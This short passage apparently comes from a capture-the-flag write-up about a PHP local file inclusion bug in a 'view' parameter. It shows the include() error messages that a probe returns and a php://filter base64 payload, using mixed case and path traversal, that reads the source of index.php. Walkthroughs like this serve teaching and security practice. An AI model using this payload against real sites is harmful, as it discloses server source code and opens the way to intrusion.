1. Try `?view=cat;dog` give us following error, which is a PHP include().
```
Warning: include(cat;dog.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'cat;dog.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
``` 
2.Use `pHp://FilTer/convert.base64-encode/resource=./cat/../index` to read source of index.php
